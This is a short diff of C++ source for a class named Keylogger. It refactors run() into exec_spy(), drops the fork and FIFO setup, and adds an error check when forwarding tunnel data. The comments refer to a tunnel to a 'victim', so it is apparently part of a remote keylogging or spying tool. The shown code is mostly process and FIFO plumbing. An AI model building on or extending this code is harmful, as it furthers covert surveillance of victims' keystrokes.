@@ -2,40 +2,7 @@
 
 // Child process spawning the window
 // Parent process will be communicating with the tunnel (victim) and forwarding packets to the fifo
-void Keylogger::run() {
-    pid_ = fork();
-    if (pid_ == -1) {
-        std::cerr << RED << "[Keylogger::run] Error creating child process" << RESET;
-        return;
-    } else if (pid_ == 0) {
-        if (tunnel_socket_ != -1) {
-            close(tunnel_socket_);
-        }
-        if (tunnel_end_socket_ != -1) {
-            close(tunnel_socket_);
-        }
-
-        spawn_window();
-        _exit(EXIT_FAILURE);
-    }
-
-    int tries = 0;
-    while ((tunnel_fifo_ = open(fifo_path_.c_str(), O_WRONLY | O_NONBLOCK)) == -1 && tries++ < 20) {
-        std::cout << YELLOW << "[Keylogger::run] Waiting for FIFO file to be created..." << RESET;
-        std::this_thread::sleep_for(std::chrono::milliseconds(200));
-    }
-
-    if (tunnel_fifo_ == -1) {
-        std::cerr << RED << "[Keylogger::run] Error opening FIFO file" << RESET;
-        return;
-    }
-    
-    tunnel_shutdown_fd_.fd = eventfd(0, EFD_NONBLOCK);
-    if (tunnel_shutdown_fd_.fd == -1) {
-        write_fifo_error("[Keylogger::run] Error creating shutdown event file descriptor " + std::string(strerror(errno)));
-        return;
-    }
-
+void Keylogger::exec_spy() {
     int rc = accept_tunnel_end();
     if (rc < 0) {
         return;
@@ -92,7 +59,10 @@ void Keylogger::run() {
                         write_fifo_error("[SpyTunnel::run] An error occurred during tunnel execution");
                         return;
                     }
-                    write(tunnel_fifo_, buf, bytes_read);
+                    rc = write(tunnel_fifo_, buf, bytes_read);
+                    if (rc < 0) {
+                        return;
+                    }
                 }
             }
         }
